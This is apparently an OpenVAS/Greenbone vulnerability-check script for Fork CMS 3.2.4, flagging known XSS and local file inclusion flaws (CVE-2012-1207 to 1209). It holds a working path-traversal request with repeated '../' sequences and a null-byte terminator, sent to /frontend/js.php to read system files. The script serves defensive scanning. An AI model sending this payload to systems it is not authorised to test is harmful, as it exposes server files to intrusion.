if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103433" );
	script_bugtraq_id( 51972 );
	script_cve_id( "CVE-2012-1209", "CVE-2012-1208", "CVE-2012-1207" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Fork CMS Cross Site Scripting and Local File Include Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51972" );
	script_xref( name: "URL", value: "http://www.fork-cms.com/blog/detail/fork-cms-3-2-5-released" );
	script_xref( name: "URL", value: "http://www.fork-cms.com/features" );
	script_xref( name: "URL", value: "https://github.com/forkcms/forkcms/commit/c8ec9c58a6b3c46cdd924532c1de99bcda6072ed" );
	script_xref( name: "URL", value: "https://github.com/forkcms/forkcms/commit/df75e0797a6540c4d656969a2e7df7689603b2cf" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-02-22 14:53:24 +0100 (Wed, 22 Feb 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Vendor update is available. Please see the references for more
information." );
	script_tag( name: "summary", value: "Fork CMS is prone to multiple cross-site scripting vulnerabilities and
a local file include vulnerability." );
	script_tag( name: "impact", value: "An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site, steal cookie-based authentication credentials, and open or run
arbitrary files in the context of the webserver process." );
	script_tag( name: "affected", value: "Fork CMS 3.2.4 is vulnerable, other versions may also be affected." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for file in keys( files ) {
		url = dir + "/frontend/js.php?module=" + crap( data: "../", length: 6 * 9 ) + files[file] + "%00&file=frontend.js&language=en";
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

